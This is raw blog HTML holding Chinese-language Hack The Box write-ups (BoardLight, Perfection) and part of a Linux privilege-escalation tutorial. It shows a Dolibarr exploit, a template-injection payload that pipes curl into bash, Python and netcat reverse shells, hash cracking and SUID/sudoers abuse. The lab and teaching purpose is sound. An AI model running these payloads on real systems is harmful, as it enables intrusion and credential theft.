class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs dns">└─$ sudo nmap -sT -sV -sC -O -p<span class="hljs-number">22,80 10.10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">11</span>                  <br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024-05-26</span> <span class="hljs-number">09</span>:<span class="hljs-number">30</span> EDT<br>Nmap scan report for <span class="hljs-number">10.10.11.11</span> (<span class="hljs-number">10.10.11.11</span>)<br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">50</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8</span>.<span class="hljs-number">2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">11</span> (Ubuntu Linux<span class="hljs-comment">; protocol 2.0)</span><br>| ssh-hostkey: <br>|   <span class="hljs-number">3072</span> <span class="hljs-number">06:2d:3b:85:10:59:ff:73</span>:<span class="hljs-number">66:27:7f:0e:ae:03:ea:f4</span> (RSA)<br>|   <span class="hljs-number">256 59:03</span>:<span class="hljs-number">dc:52:87:3a:35:99:34:44</span>:<span class="hljs-number">74:33:78:31</span>:<span class="hljs-number">35</span>:fb (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">ab:13:38:e4:3e:e0:24:b4</span>:<span class="hljs-number">69:38:a9:63:82:38:dd:f4</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">41</span> ((Ubuntu))<br>|_http-title: Site doesn&#x27;t have a title (text/html<span class="hljs-comment">; charset=UTF-8).</span><br>|_http-server-header: Apache/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">41</span> (Ubuntu)<br>Warning: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br>Aggressive OS guesses: Linux <span class="hljs-number">4</span>.<span class="hljs-number">15</span> - <span class="hljs-number">5</span>.<span class="hljs-number">8</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">5</span>.<span class="hljs-number">3</span> - <span class="hljs-number">5</span>.<span class="hljs-number">4</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">1</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span> (<span class="hljs-number">95</span>%), AXIS <span class="hljs-number">210</span><span class="hljs-keyword">A</span> or <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">17</span>) (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">5</span>.<span class="hljs-number">0</span> - <span class="hljs-number">5</span>.<span class="hljs-number">5</span> (<span class="hljs-number">94</span>%), ASUS RT-N56U WAP (Linux <span class="hljs-number">3</span>.<span class="hljs-number">4</span>) (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3</span>.<span class="hljs-number">16</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">5</span>.<span class="hljs-number">0</span> - <span class="hljs-number">5</span>.<span class="hljs-number">4</span> (<span class="hljs-number">93</span>%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">2</span> hops<br>Service Info: OS: Linux<span class="hljs-comment">; CPE: cpe:/o:linux:linux_kernel</span><br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">53</span>.<span class="hljs-number">19</span> seconds<br></code></pre></td></tr></table></figure><p>我测试主站的时候发现很奇怪<code>http://board.htb/contact.php</code> 提交表单的时候没有 POST传输数据,猜测可能存在其它突破点,爆破子域</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>amass<span class="hljs-regexp">/subdomains-top1mil-5000.txt -u http:/</span><span class="hljs-regexp">/board.htb/</span> -H <span class="hljs-string">&quot;Host:FUZZ.board.htb&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencodeed&quot;</span> -c<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>amass<span class="hljs-regexp">/subdomains-top1mil-5000.txt -u http:/</span><span class="hljs-regexp">/board.htb/</span> -H <span class="hljs-string">&quot;Host:FUZZ.board.htb&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencodeed&quot;</span> -c -fs <span class="hljs-number">15949</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/172.png"></p><p>访问 <code>http://crm.board.htb</code> 发现网站架设的是 <code>Dolibarr</code> 我们直接搜 默认密码 admin&#x2F;admin 直接进去了</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/174.png"></p><p>我尝试在网上查找以前爆出的漏洞 </p><p><a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> exploit.py http://crm.board.htb admin admin <span class="hljs-number">10.10.16.22</span> <span class="hljs-number">9001</span><br></code></pre></td></tr></table></figure><p>在本地监听<strong>9001</strong> 端口可以拿到非交互式终端</p><figure class="highlight flix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flix">python3 -c &#x27;<span class="hljs-keyword">import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;  <span class="hljs-comment">//简历交互式终端</span><br></code></pre></td></tr></table></figure><p><strong>重要</strong></p><p>我们拿到shell 需要进一步信息收集(ssh,数据库 账号密码)</p><p>开源的应用我们可以去查找安装文档  <a href="https://cn.linux-console.net/?p=21919">https://cn.linux-console.net/?p=21919</a>  </p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/175.png"></p><p>在本靶场的配置参数如下</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/173.png"></p><p>拿到数据库的账号密码，发现数据库中并没有什么有用的信息</p><p>发现存在一个用户 <code>larissa</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@boardlight</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls<br>ls<br>larissa<br>www-data<span class="hljs-variable">@boardlight</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>cd larissa<br>cd larissa<br><span class="hljs-symbol">bash:</span> <span class="hljs-symbol">cd:</span> <span class="hljs-symbol">larissa:</span> <span class="hljs-title class_">Permission</span> denied<br></code></pre></td></tr></table></figure><p>尝试 ssh 连接</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> larissa@<span class="hljs-number">10.10.11.11</span><br>serverfun2<span class="hljs-variable">$2023</span>!!<br></code></pre></td></tr></table></figure><p>能够连接</p><p>用工具检测可以进行提权的地方linpeas</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">本机 <span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> http.server <span class="hljs-number">80</span><br>靶机 wget http://<span class="hljs-number">10.10</span>.<span class="hljs-number">16.22</span>/linpeas.<span class="hljs-keyword">sh</span> -<span class="hljs-keyword">P</span> /tmp/linpeas.<span class="hljs-keyword">sh</span><br>chmod +<span class="hljs-keyword">x</span> linpeas.<span class="hljs-keyword">sh</span><br>./linpeas.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/176.png"></p><p>我们在网站  <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>  进行对比 好像都没有提权方法，然后我们在网上找到  enlightenment exploit</p><p><a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh</a></p><p>下载运行后就是 root权限</p>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Perfection(HTB)</title>
    <link href="/2024/06/03/Perfection-HTB/"/>
    <url>/2024/06/03/Perfection-HTB/</url>
    
    <content type="html"><![CDATA[<p>写在前面，文章中的大多数内容在网上可以找到，我是为了在记录总结中学习，故此写下这篇文章</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs less">└─# <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-p-</span> <span class="hljs-selector-tag">--min-rate</span> <span class="hljs-number">1000</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-class">.253</span>  <br><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.94S</span><span class="hljs-selector-tag">VN</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-06-01 07:11 EDT</span><br>Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">11.253</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.253</span>)<br>Host is up (<span class="hljs-number">0.44s</span> latency).<br><span class="hljs-keyword">Not</span> <span class="hljs-attribute">shown</span>: <span class="hljs-number">65533</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">92.73</span> seconds<br>                                                                <br>┌──(root㉿kali)-[/home/kali/桌面]<br>└─# nmap -sT -sV -sC -O -p22,<span class="hljs-number">80</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.253</span><br>Starting Nmap <span class="hljs-number">7.94S</span>VN ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-06-01 07:13 E</span><br>Nmap <span class="hljs-attribute">scan</span> report for <span class="hljs-number">10.10</span>.<span class="hljs-number">11.253</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">11.253</span>)<br>Host is up (<span class="hljs-number">0.46s</span> latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">6</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-attribute">ssh-hostkey</span>: <br>|   <span class="hljs-number">256</span> <span class="hljs-number">80</span>:<span class="hljs-attribute">e4</span>:<span class="hljs-number">79</span>:<span class="hljs-attribute">e8</span>:<span class="hljs-number">59</span>:<span class="hljs-number">28</span>:<span class="hljs-attribute">df</span>:<span class="hljs-number">95</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">ad</span>:<span class="hljs-number">57</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span>:<span class="hljs-number">04</span>:<span class="hljs-attribute">ea</span>:<span class="hljs-number">70</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-attribute">e9</span>:<span class="hljs-attribute">ea</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">86</span>:<span class="hljs-number">13</span>:<span class="hljs-attribute">ed</span>:<span class="hljs-number">95</span>:<span class="hljs-attribute">a9</span>:<span class="hljs-attribute">d0</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">c8</span>:<span class="hljs-number">22</span>:<span class="hljs-attribute">e4</span>:<span class="hljs-attribute">cf</span>:e9 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx<br>|<span class="hljs-attribute">_http-title</span>: Weighted Grade Calculator<br></code></pre></td></tr></table></figure><p>扫描目录  并没有什么有用的东西</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/167-1717243921580-2.png"></p><p>我们发现WEB端服务器是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WEBrick</span>/<span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">0</span> (Ruby/<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>/<span class="hljs-number">2021</span>-<span class="hljs-number">07</span>-<span class="hljs-number">07</span>)<br></code></pre></td></tr></table></figure><p>WEB页面中唯一存在数据交互的地方就是提交表单处</p><p>我们发现是将<code>grade1&amp;weight1</code> 这两个参数相乘， 做题的时候我就猜测可能会是模板注入</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/168.png"></p><p>当我在参数处添加模板注入语句 首先会返回编码错误，当我们编码后 又返回恶意参数 我尝试fuzz进行绕过 我们发现 <code>%0a</code> 可以进行绕过</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;%25%3d+<span class="hljs-string">`ls+/`</span>+%25&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/169.png"></p><p>反弹shell的命令，在bp中发送的时候需要url编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">category1</span>=aa%<span class="hljs-number">0</span>a&lt;%=`curl http://<span class="hljs-number">10.10.16.18:80</span>/<span class="hljs-number">1</span>.sh|bash`%&gt;&amp;grade1=<span class="hljs-number">10</span>&amp;weight1=<span class="hljs-number">100</span>&amp;category2=N%<span class="hljs-number">2</span>FA&amp;grade2=<span class="hljs-number">0</span>&amp;weight2=<span class="hljs-number">0</span>&amp;category3=N%<span class="hljs-number">2</span>FA&amp;grade3=<span class="hljs-number">0</span>&amp;weight3=<span class="hljs-number">0</span>&amp;category4=N%<span class="hljs-number">2</span>FA&amp;grade4=<span class="hljs-number">0</span>&amp;weight4=<span class="hljs-number">0</span>&amp;category5=N%<span class="hljs-number">2</span>FA&amp;grade5=<span class="hljs-number">0</span>&amp;weight5=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">category1</span>=aaa%<span class="hljs-number">0</span>a&lt;%<span class="hljs-number">25</span>%<span class="hljs-number">3</span>d`python3+-c+&#x27;import+socket,subprocess,os%<span class="hljs-number">3</span>bs%<span class="hljs-number">3</span>dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%<span class="hljs-number">3</span>bs.connect((<span class="hljs-string">&quot;10.10.16.18&quot;</span>,<span class="hljs-number">9003</span>))%<span class="hljs-number">3</span>bos.dup2(s.fileno(),<span class="hljs-number">0</span>)%<span class="hljs-number">3</span>b+os.dup2(s.fileno(),<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>b+os.dup2(s.fileno(),<span class="hljs-number">2</span>)%<span class="hljs-number">3</span>bp%<span class="hljs-number">3</span>dsubprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])%<span class="hljs-number">3</span>b&#x27;`%<span class="hljs-number">25</span>&gt;&amp;grade1=<span class="hljs-number">10</span>&amp;weight1=<span class="hljs-number">100</span>&amp;category2=N%<span class="hljs-number">2</span>FA&amp;grade2=<span class="hljs-number">0</span>&amp;weight2=<span class="hljs-number">0</span>&amp;category3=N%<span class="hljs-number">2</span>FA&amp;grade3=<span class="hljs-number">0</span>&amp;weight3=<span class="hljs-number">0</span>&amp;category4=N%<span class="hljs-number">2</span>FA&amp;grade4=<span class="hljs-number">0</span>&amp;weight4=<span class="hljs-number">0</span>&amp;category5=N%<span class="hljs-number">2</span>FA&amp;grade5=<span class="hljs-number">0</span>&amp;weight5=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>我查看具有s权限的二进制文件发现没有什么可利用， <code>sudo -l</code> 也没有不能使用 所有我们在服务器上查看跟 susan相关的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 用户拥有的文件</span><br>find / -uid 1001 - <span class="hljs-built_in">type</span> f - <span class="hljs-built_in">ls</span> 2&gt;/dev/null | grep -v <span class="hljs-string">&quot;/proc*&quot;</span> <br><br><span class="hljs-comment"># 包含用户名的文件</span><br>find / -name <span class="hljs-string">&quot;*susan*&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">ls</span> 2&gt;/dev/null <br><span class="hljs-built_in">cat</span> /var/mail/susan <br><br><span class="hljs-comment"># 主目录中包含单词 password 的文件</span><br>grep -i password -R . <br>strings Migration/pupilpath_credentials.db | grep -i <span class="hljs-string">&quot;susan&quot;</span>  <span class="hljs-comment"># &quot;tina&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/170.png"></p><p>在 <code>/var/mail/susan</code> 中发现，密码命名格式</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;firstname&#125;</span><span class="language-xml">_</span><span class="hljs-template-variable">&#123;firstname backwards&#125;</span><span class="language-xml">_</span><span class="hljs-template-variable">&#123;randomly generated integer between 1 and 1,000,000,000&#125;</span><br></code></pre></td></tr></table></figure><p>查找包含密码的文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">susan@perfection:~$ <span class="hljs-keyword">grep</span> -i password -R . <br><span class="hljs-keyword">grep</span> -i password -R . <br><span class="hljs-keyword">grep</span>: .<span class="hljs-regexp">/Migration/</span>pupilpath_credentials.db: binary <span class="hljs-keyword">file</span> matches<br>susan@perfection:~$ strings Migration/pupilpath_credentials.db | <span class="hljs-keyword">grep</span> -i <span class="hljs-string">&quot;susan&quot;</span>  # <span class="hljs-string">&quot;tina&quot;</span><br>&lt;upilpath_credentials.db | <span class="hljs-keyword">grep</span> -i <span class="hljs-string">&quot;susan&quot;</span>  # <span class="hljs-string">&quot;tina&quot;</span><br>Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f<br></code></pre></td></tr></table></figure><p>利用已知的信息  尝试爆破密码</p><p>参考   <a href="https://xz.aliyun.com/t/4008">https://xz.aliyun.com/t/4008</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 确定哈希类型，根据密码格式一次确定一个哈希</span><br><span class="hljs-attribute">hashcat</span> -a <span class="hljs-number">3</span> ./hash susan_nasus_?d?d?d?d?d?d?d?d?d<br><br><span class="hljs-comment"># 破解密码（仅显示帮助提升权限的用户）</span><br><span class="hljs-attribute">hashcat</span> -a <span class="hljs-number">3</span> -m <span class="hljs-number">1400</span> ./hash  <span class="hljs-string">&quot;susan_nasus_?d?d?d?d?d?d?d?d?d&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">-<span class="hljs-selector-tag">a</span>  指定要使用的破解模式，其值参考后面对参数。“-<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span>”字典攻击，“-<span class="hljs-selector-tag">a</span> <span class="hljs-number">1</span>” 组合攻击；“-<span class="hljs-selector-tag">a</span> <span class="hljs-number">3</span>”掩码攻击。<br>-m  指定要破解的hash类型，如果不指定类型，则默认是MD5<br></code></pre></td></tr></table></figure><p>拿到密码后就可以直接切换到root用户</p><p><img src="https://cdn.jsdelivr.net/gh/backk0m/image-bed/171.png"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">susan _nasus_<span class="hljs-number">413759210</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权</title>
    <link href="/2024/06/01/Linux%E6%8F%90%E6%9D%83/"/>
    <url>/2024/06/01/Linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>写在前面，文章中的大多数内容在网上可以找到，我是为了在记录总结中学习，故此写下这篇文章</p><h3 id="1-漏洞提权"><a href="#1-漏洞提权" class="headerlink" title="1.漏洞提权"></a>1.漏洞提权</h3><h3 id="2-suid提权"><a href="#2-suid提权" class="headerlink" title="2.suid提权"></a>2.suid提权</h3><p>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename <span class="hljs-comment">#设置suid</span><br><span class="hljs-built_in">chmod</span> u-s filename <span class="hljs-comment">#去除suid</span><br></code></pre></td></tr></table></figure><p>查找root用户拥有的文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><ul><li><code>find</code>: 这是一个用于在文件系统中查找文件的命令。</li><li><code>/</code>: 这表示要从根目录开始搜索，也就是整个文件系统。</li><li><code>-user root</code>: 这个选项指定要查找的文件的所有者是 root 用户。</li><li><code>-perm -4000</code>: 这个选项指定要查找的文件权限是设置了 SUID（Set User ID）权限的，SUID 权限是一种特殊权限，允许一个程序在执行时临时拥有其拥有者的权限。</li><li><code>-print</code>: 这个选项指定找到的文件应该被打印（显示）出来。</li><li><code>2&gt;/dev/null</code>: 这个部分是将标准错误重定向到 <code>/dev/null</code>，意味着任何错误信息将被忽略，这样做是为了避免显示由于权限不足而无法访问的目录或文件时产生的错误信息。</li></ul><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>find + 目标目录(路径) + &lt;选项&gt; + 参数</p><p><code>find</code>用于在指定目录下查找文件。<code>-exec</code>参数可以用来执行命令，系统上find命令默认没有<code>SUID</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \; -quit<br>find -<span class="hljs-built_in">exec</span> /bin/sh -p \; -quit<br></code></pre></td></tr></table></figure><p><code>-p</code> 不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，向上继承euid，因为bash有suid权限，所以这里是root。</p><p>反弹shell</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span><span class="hljs-built_in"> user </span>-exec nc -lvp 4444 -e <span class="hljs-string">&#x27;/bin/sh&#x27;</span> \;<br>nc<span class="hljs-built_in"> ip </span>4444<br></code></pre></td></tr></table></figure><p>python反弹shell</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.6.47&quot;</span>,<span class="hljs-number">7777</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">/usr/bin/find <span class="hljs-number">1.</span>txt -<span class="hljs-keyword">exec</span> python -c  &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.6.47&quot;</span>,<span class="hljs-number">7777</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27; \;<br></code></pre></td></tr></table></figure><h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h4><p>当vim具有suid权限后，意味着任何用户都可以使用vim命令来编辑那些只能由root编辑的文件，例如 <code>/etc/sudoers</code> 文件 ，在sudoers文件中配置普通用户的权限，权限和root一样</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ALL=(ALL:ALL) ALL<br></code></pre></td></tr></table></figure><p>vim编辑后保存时用 wq!强制保存，vim运行时虽然是root权限，但是wq依然会提示只读</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">sudo bash  <span class="hljs-comment">//切换到root用户</span><br></code></pre></td></tr></table></figure><h4 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h4><p><code>cp</code> 和 <code>mv</code> 是Linux 系统中常用的命令，用于文件和目录的复制和移动</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cp file1<span class="hljs-selector-class">.txt</span> file2<span class="hljs-selector-class">.txt</span>    <span class="hljs-comment">//将file1.txt文件复制到 file2.txt</span><br>mv file1<span class="hljs-selector-class">.txt</span> file2.txt<br></code></pre></td></tr></table></figure><p>当cp 有suid权限的时候我们可以修改 &#x2F;etc&#x2F;passwd    &#x2F;etc&#x2F;shadow</p><p><strong>&#x2F;etc&#x2F;passwd</strong> 